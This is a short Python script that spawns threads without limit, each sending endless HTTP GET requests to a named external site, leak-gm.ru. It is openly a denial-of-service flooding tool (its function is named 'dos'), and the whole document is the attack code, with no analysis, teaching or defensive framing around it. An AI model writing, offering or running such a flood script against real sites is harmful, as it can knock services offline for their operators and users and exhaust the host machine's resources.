# coding: utf8
import threading
import requests
def dos():
 while True:
  requests.get("https://leak-gm.ru")
  
while True:
 threading.Thread(target=dos).start()